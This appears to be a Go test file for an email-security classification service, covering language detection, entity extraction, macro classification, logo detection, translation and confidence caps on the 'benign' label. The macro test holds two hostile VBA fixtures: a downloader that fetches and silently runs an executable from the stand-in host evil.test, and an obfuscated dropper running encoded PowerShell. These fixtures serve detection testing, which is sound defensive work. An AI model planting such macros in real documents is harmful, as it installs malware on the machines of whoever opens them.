// SPDX-License-Identifier: AGPL-3.0-only

package main

import (
	"context"
	"encoding/json"
	"strings"
	"testing"
)

// These test the half of the service that needs no weights, which is the half a fresh
// deployment runs. The entailment model is exercised separately and only when one is
// present; see TestZeroShotIfPresent.

func TestLanguageNamesAreWhatRulesCompareAgainst(t *testing.T) {
	// The contract is English names in lowercase, not ISO codes: the corpus writes
	// `.language == "english"`. Returning "en" would match nothing and raise no error
	// anywhere, so this is the test that stops a plausible refactor breaking every
	// language-gated rule silently.
	for _, tc := range []struct{ text, want string }{
		{"Please confirm that you have received this message and let me know if you have any questions about the attached invoice.", "english"},
		{"Veuillez confirmer que vous avez bien reçu ce message et nous faire savoir si vous avez des questions sur la facture.", "french"},
		{"Bitte bestätigen Sie den Erhalt dieser Nachricht und teilen Sie uns mit, ob Sie Fragen zu der Rechnung haben.", "german"},
		{"このメッセージを受け取ったことを確認してください。ご質問がありましたらお知らせください。", "japanese"},
		{"Пожалуйста, подтвердите получение этого сообщения и сообщите нам, если у вас есть вопросы.", "russian"},
	} {
		got, conf := detectLanguage(tc.text)
		if got != tc.want {
			t.Errorf("detectLanguage(%.30q) = %q (%.2f), want %q", tc.text, got, conf, tc.want)
		}
	}
}

func TestLanguageIsUnknownRatherThanGuessed(t *testing.T) {
	// A rule reading `.language == "english"` on a two-word body should report
	// indeterminate. Answering "english" because most mail is English is the kind of
	// confident default this engine exists not to make.
	for _, text := range []string{"", "ok", "   \n  ", "$$$ !!!"} {
		if got, _ := detectLanguage(text); got != "" {
			t.Errorf("detectLanguage(%q) = %q, want unknown", text, got)
		}
	}
}

func TestEntitiesCarryTheirSpan(t *testing.T) {
	// The corpus reads .text on an entity 209 times — more often than .confidence.
	// An entity without the words behind it answers a question nobody asked.
	body := "Hi Susan,\n\nI need you to process an urgent wire transfer of $48,500.00 " +
		"to a new vendor before the end of the day.\n\nKind regards,\nDavid Mercer\n"
	got := map[string][]string{}
	for _, f := range extractEntities(body) {
		got[f.Name] = append(got[f.Name], f.Text)
		if f.Text == "" {
			t.Errorf("entity %q has no span", f.Name)
		}
	}
	for _, want := range []string{"request", "urgency", "financial", "greeting", "salutation", "recipient"} {
		if len(got[want]) == 0 {
			t.Errorf("no %s entity found in %q; got %v", want, body, keys(got))
		}
	}
	if !contains(got["financial"], "$48,500.00") {
		t.Errorf("financial entity did not capture the amount: %v", got["financial"])
	}
	if !contains(got["recipient"], "Susan") {
		t.Errorf("recipient entity did not capture the name: %v", got["recipient"])
	}
}

func TestSalutationMustBeASignOff(t *testing.T) {
	// "Thank you for your purchase" opening a receipt is not a salutation. Position
	// is part of what makes one, and without that check every receipt in the corpus
	// grows a spurious entity.
	receipt := "Thank you for your purchase. Your subscription has renewed for $499.99.\n" +
		strings.Repeat("Order details follow below and your invoice is attached for your records.\n", 6)
	for _, f := range extractEntities(receipt) {
		if f.Name == "salutation" {
			t.Errorf("opening 'Thank you' classified as a salutation: %q", f.Text)
		}
	}
}

func TestNLUOmitsWhatNoModelCanAnswer(t *testing.T) {
	// The invariant this whole service is arranged around. With no model the result
	// must *omit* intents, topics and tags rather than send empty arrays: the corpus
	// negates these to exclude benign mail, so an empty array makes the negation true
	// and the rule fires because nothing was deployed.
	n := NewNLU(nil)
	out, err := n.Infer(context.Background(), Request{Text: "Hello there, please review the attached document."})
	if err != nil {
		t.Fatal(err)
	}
	raw, err := json.Marshal(out)
	if err != nil {
		t.Fatal(err)
	}
	var m map[string]any
	if err := json.Unmarshal(raw, &m); err != nil {
		t.Fatal(err)
	}
	for _, absent := range []string{"intents", "topics", "tags"} {
		if v, ok := m[absent]; ok {
			t.Errorf("%s present as %#v with no model loaded; it must be absent so MQL sees null", absent, v)
		}
	}
	if _, ok := m["entities"]; !ok {
		t.Error("entities absent; they need no model and must still be answered")
	}
	if _, ok := m["language"]; !ok {
		t.Error("language absent; it needs no model and must still be answered")
	}
}

func TestMacroClassifierNeedsMoreThanOneFamily(t *testing.T) {
	for _, tc := range []struct {
		name      string
		src       string
		malicious bool
		conf      string
	}{
		{
			// Ordinary: runs on open and does nothing else. Plenty of real documents
			// do exactly this, and calling it malicious is how a macro classifier
			// becomes something operators turn off.
			name: "autorun only",
			src:  "Sub Document_Open()\n  MsgBox \"Welcome\"\nEnd Sub\n",
		},
		{
			name: "downloader",
			src: `Sub AutoOpen()
  Dim x
  Set x = CreateObject("MSXML2.XMLHTTP")
  x.Open "GET", "http://evil.test/p.exe", False
  x.send
  Set s = CreateObject("ADODB.Stream")
  s.SaveToFile Environ("TEMP") & "\p.exe"
  Shell Environ("TEMP") & "\p.exe", vbHide
End Sub`,
			malicious: true, conf: ConfHigh,
		},
		{
			name:      "obfuscated dropper",
			src:       "Sub Workbook_Open()\n  a = Chr(104) & Chr(116) & Chr(116) & Chr(112) & Chr(115)\n  Set w = CreateObject(StrReverse(\"llehS.tpircSW\"))\n  w.Run \"powershell -enc SQBFAFgA\"\nEnd Sub",
			malicious: true, conf: ConfHigh,
		},
		{
			name: "no macro at all",
			src:  "This document has no macros in it whatsoever.",
			conf: ConfHigh,
		},
	} {
		t.Run(tc.name, func(t *testing.T) {
			out, err := MacroClassifier{}.Infer(context.Background(), Request{Text: tc.src})
			if err != nil {
				t.Fatal(err)
			}
			r := out.(macroResult)
			if r.Malicious != tc.malicious {
				t.Errorf("malicious = %v, want %v (score %.1f, %v)", r.Malicious, tc.malicious, r.Score, r.Indicators)
			}
			if tc.conf != "" && r.Confidence != tc.conf {
				t.Errorf("confidence = %q, want %q", r.Confidence, tc.conf)
			}
		})
	}
}

func TestLogoDetectDistinguishesEmptyFromBlind(t *testing.T) {
	l := &LogoDetect{}
	ctx := context.Background()

	// Nothing to look with: not "no brands present".
	out, err := l.Infer(ctx, Request{})
	if err != nil {
		t.Fatal(err)
	}
	if !out.(logoResult).Unavailable {
		t.Error("with no OCR text and no reference pack the result must be unavailable, not an empty brand list")
	}

	// OCR text present and no brand in it: a real, confident empty answer.
	out, err = l.Infer(ctx, Request{Options: map[string]string{"ocr_text": "Quarterly planning agenda"}})
	if err != nil {
		t.Fatal(err)
	}
	r := out.(logoResult)
	if r.Unavailable {
		t.Error("OCR text was available; the answer is empty, not unknown")
	}
	if len(r.Brands) != 0 {
		t.Errorf("unexpected brands: %v", r.Brands)
	}

	// A wordmark.
	out, _ = l.Infer(ctx, Request{Options: map[string]string{"ocr_text": "Sign in to your PayPal account"}})
	r = out.(logoResult)
	if len(r.Brands) != 1 || r.Brands[0].Name != "PayPal" {
		t.Errorf("wordmark not detected: %+v", r.Brands)
	}
}

func TestBrandVocabularyMatchesTheCorpus(t *testing.T) {
	// Every brand either has a text pattern or is reference-pack only. A brand with
	// neither is a name the service can never return, and a rule comparing against it
	// is dead code nobody would notice.
	packOnly := map[string]bool{"X": true, "FakeAttachment": true, "Generic Webmail": true, "Invite Company": true}
	for _, b := range Brands {
		_, hasPattern := brandPatterns[b]
		if !hasPattern && !packOnly[b] {
			t.Errorf("brand %q has no wordmark pattern and is not marked reference-pack only", b)
		}
	}
}

func TestTranslateReturnsIdentityForTargetLanguage(t *testing.T) {
	// Text already in the target language needs no backend, and this is not a
	// shortcut: it is the correct translation, and it is the common case.
	tr := NewTranslate("", "", "en")
	out, err := tr.Infer(context.Background(), Request{
		Text: "Please confirm that you have received this message and let me know if you have questions.",
	})
	if err != nil {
		t.Fatal(err)
	}
	r := out.(translateResult)
	if r.Unavailable {
		t.Fatal("English text with an English target reported unavailable")
	}
	if r.Text == nil || !strings.HasPrefix(*r.Text, "Please confirm") {
		t.Errorf("text not returned unchanged: %+v", r.Text)
	}
	if r.SourceLanguage == nil || *r.SourceLanguage != "english" {
		t.Errorf("source_language = %v, want english", r.SourceLanguage)
	}

	// A different language with no backend is unavailable, not untranslated. Handing
	// back the original would send French to a classifier that does not read it and
	// get a confident answer about the wrong thing.
	out, _ = tr.Infer(context.Background(), Request{
		Text: "Veuillez confirmer que vous avez bien reçu ce message et nous faire savoir si vous avez des questions.",
	})
	if !out.(translateResult).Unavailable {
		t.Error("French with no backend must be unavailable rather than passed through untranslated")
	}
}

func TestAttackScoreWithholdsAVerdictItCannotSupport(t *testing.T) {
	a := &AttackScore{cap: "beta.fuzzy_attack_score", nlu: NewNLU(nil)}
	out, err := a.Infer(context.Background(), Request{MDM: json.RawMessage(`{"subject":"Hello","body":"Just checking in."}`)})
	if err != nil {
		t.Fatal(err)
	}
	if v := out.(attackResult).Verdict; v != "" {
		t.Errorf("verdict %q returned with no intent model and no bulk headers; want none so MQL sees null", v)
	}

	// Bulk headers are decisive on their own, and graymail is the one verdict the
	// corpus actually reads.
	out, _ = a.Infer(context.Background(), Request{MDM: json.RawMessage(
		`{"subject":"Our December newsletter","body":"News","headers":{"list_unsubscribe":"<https://x.test/u>","precedence":"bulk"}}`)})
	if v := out.(attackResult).Verdict; v != "graymail" {
		t.Errorf("verdict = %q, want graymail", v)
	}
}

func TestQuotedHistoryIsNotClassified(t *testing.T) {
	// A reply to a newsletter is not a newsletter.
	body := "Sure, I'll take a look.\n\nOn Tue, 3 Mar 2026 at 09:14, News <n@x.test> wrote:\n> Our weekly digest\n> Unsubscribe here\n"
	got := normaliseBody(body)
	if strings.Contains(got, "digest") || strings.Contains(got, "Unsubscribe") {
		t.Errorf("quoted history survived normalisation: %q", got)
	}
	if !strings.Contains(got, "I'll take a look") {
		t.Errorf("the actual message was removed: %q", got)
	}
}

func keys[V any](m map[string]V) []string {
	out := make([]string, 0, len(m))
	for k := range m {
		out = append(out, k)
	}
	return out
}

func contains(hay []string, needle string) bool {
	for _, h := range hay {
		if strings.Contains(h, needle) {
			return true
		}
	}
	return false
}

// TestNormalisationNeverDiscardsTheMessage covers a silent, severe failure.
//
// A FedEx brand-impersonation sample from the rule corpus arrives as a single
// 1,890-character line that begins with Outlook's row of underscores. The first
// version of normaliseBody treated that as a thread separator, broke on it, and
// handed the classifier nothing but the subject — which scored benign at 0.77.
//
// That is the worst available direction for this particular error. `benign` is the
// one intent the corpus uses to *suppress*, so a confident benign does not raise a
// false alert, it silently stops rules that would have fired.
func TestNormalisationNeverDiscardsTheMessage(t *testing.T) {
	for _, tc := range []struct{ name, in, want string }{
		{
			name: "single line starting with a rule",
			in:   strings.Repeat("_", 80) + " This tracking update has been requested by FedEx. Click to view.",
			want: "This tracking update",
		},
		{
			name: "single line starting with a quote marker",
			in:   "> " + strings.Repeat("the whole message is on one line. ", 40),
			want: "the whole message",
		},
		{
			name: "a rule on its own line still separates",
			in:   "Here is the actual message.\n" + strings.Repeat("_", 80) + "\nquoted history below\nmore quoted history\nand more\nand more again",
			want: "Here is the actual message.",
		},
	} {
		t.Run(tc.name, func(t *testing.T) {
			got := normaliseBody(tc.in)
			if !strings.Contains(got, tc.want) {
				t.Errorf("normaliseBody dropped the message.\n got %.80q\nwant it to contain %q", got, tc.want)
			}
		})
	}

	// The separator must still work when it is genuinely a separator.
	full := "The real message.\n\n" + strings.Repeat("_", 80) + "\n" +
		strings.Repeat("quoted history that should not be classified\n", 20)
	got := normaliseBody(full)
	if strings.Contains(got, "quoted history") {
		t.Errorf("a genuine thread separator no longer strips history: %.120q", got)
	}
}

// A suppressive label must not reach high confidence unless that is asked for.
//
// `benign` is the only intent the corpus uses to stop a rule firing, so a wrong
// benign:high is a silent false negative rather than a noisy false positive. The
// default therefore caps it, and the cap has to survive a message the model is
// extremely confident about — which is exactly the case that would slip through.
func TestBenignIsCappedUnlessTrusted(t *testing.T) {
	// A model that is certain the message is benign and certain of nothing else.
	fake := fakeZeroShot(map[string]float64{"benign": 0.99})

	capped := NewNLU(fake)
	fs, err := capped.classify(context.Background(), sampleBody, Intents, false)
	if err != nil {
		t.Fatal(err)
	}
	for _, f := range fs {
		if f.Name == "benign" && f.Confidence == ConfHigh {
			t.Error("benign reported high with suppression untrusted; a wrong benign would stop rules firing")
		}
	}

	trusted := NewNLU(fake)
	trusted.T.TrustSuppression = true
	fs, err = trusted.classify(context.Background(), sampleBody, Intents, false)
	if err != nil {
		t.Fatal(err)
	}
	found := false
	for _, f := range fs {
		if f.Name == "benign" && f.Confidence == ConfHigh {
			found = true
		}
	}
	if !found {
		t.Error("benign not reported high even with suppression trusted and a 0.99 score")
	}
}

// A firing label is not held to the suppressive standard: capping those would lose
// detections, which is the opposite of the trade being made.
func TestFiringLabelsAreNotCapped(t *testing.T) {
	n := NewNLU(fakeZeroShot(map[string]float64{"cred_theft": 0.99}))
	fs, err := n.classify(context.Background(), sampleBody, Intents, false)
	if err != nil {
		t.Fatal(err)
	}
	for _, f := range fs {
		if f.Name == "cred_theft" {
			if f.Confidence != ConfHigh {
				t.Errorf("cred_theft reported %q with a 0.99 score, want high", f.Confidence)
			}
			return
		}
	}
	t.Error("cred_theft not reported at all")
}

type fakeZS map[string]float64

func fakeZeroShot(m map[string]float64) ZeroShot { return fakeZS(m) }

func (f fakeZS) Score(_ context.Context, _ string, labels []Label) (map[string]float64, error) {
	out := make(map[string]float64, len(labels))
	for _, l := range labels {
		out[l.Name] = f[l.Name] // absent labels score zero
	}
	return out, nil
}
func (f fakeZS) Close() error { return nil }

// sampleBody stands in for a message body in the threshold tests.
//
// Long enough to be classified at all: the classifier declines fragments, so a
// one-word placeholder tests the length gate rather than the thresholds these tests
// are about.
const sampleBody = "Please confirm your account password today or access will be suspended."

// A fragment is answered without inference.
//
// The cost of a zero-shot pass is the label count, not the text length, so a two-word
// link label costs as much as a whole email — five seconds on the machine this was
// measured on. Rules that classify link display text do it once per link, and one
// real message spent twenty-four seconds on nine of them.
func TestFragmentsAreNotSentToTheModel(t *testing.T) {
	counting := &countingZS{scores: map[string]float64{"cred_theft": 0.99}}
	n := NewNLU(counting)

	for _, fragment := range []string{
		"billing settings", "Click here", "Unsubscribe", "", "View in browser",
	} {
		fs, err := n.classify(context.Background(), fragment, Intents, false)
		if err != nil {
			t.Fatalf("%q: %v", fragment, err)
		}
		if len(fs) != 0 {
			t.Errorf("%q produced findings %v; a fragment has no ask in it to detect",
				fragment, fs)
		}
	}
	if counting.calls != 0 {
		t.Errorf("the model was run %d times on fragments, want 0", counting.calls)
	}

	// And the bar is low enough that a short real instruction still gets through.
	if _, err := n.classify(context.Background(),
		"please wire the funds today", Intents, false); err != nil {
		t.Fatal(err)
	}
	if counting.calls != 1 {
		t.Errorf("a short but real instruction was not classified (calls=%d)", counting.calls)
	}
}

type countingZS struct {
	scores map[string]float64
	calls  int
}

func (c *countingZS) Score(ctx context.Context, text string, labels []Label) (map[string]float64, error) {
	c.calls++
	out := map[string]float64{}
	for _, l := range labels {
		out[l.Name] = c.scores[l.Name]
	}
	return out, nil
}

func (c *countingZS) Close() error { return nil }
